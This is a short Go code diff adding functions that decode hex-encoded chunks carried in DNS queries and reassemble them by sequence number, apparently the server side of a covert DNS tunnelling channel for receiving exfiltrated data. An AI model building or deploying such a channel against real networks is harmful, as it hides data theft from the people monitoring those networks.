@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/hex"
 	"fmt"
 	"sync"
 
@@ -65,6 +66,35 @@ func allSequencesReceived(lastSequence int) bool {
 	}
 
 	return true
+}
+
+func handleHexChunk(hexChunk string, sequenceNumber int) {
+	// Decode the hex chunk
+	decodedChunk, err := hex.DecodeString(hexChunk)
+	if err != nil {
+		fmt.Printf("Invalid hex chunk '%s' in query: %d (Error: %v)\n", hexChunk, sequenceNumber, err)
+		return // Ignore this malformed query part
+	}
+
+	mapMutex.Lock()
+	defer mapMutex.Unlock()
+
+	// Store the decoded chunk
+	// Check if we already have this chunk (simple duplicate handling)
+	if _, exists := receivedChunks[sequenceNumber]; !exists {
+		receivedChunks[sequenceNumber] = decodedChunk
+		fmt.Printf("Stored chunk: Seq=%d, Size=%d bytes", sequenceNumber, len(decodedChunk))
+	} else {
+		fmt.Printf("Duplicate chunk received: Seq=%d", sequenceNumber)
+	}
+}
+
+func handleEndSignal(sequenceNumber int) {
+	mapMutex.Lock()
+	defer mapMutex.Unlock()
+
+	endSignalReceived = true
+	lastSequenceNumber = sequenceNumber
 }
 
 func getCovertDNSRequestHandler(questionHandler func(q dns.Question)) func(w dns.ResponseWriter, r *dns.Msg) {
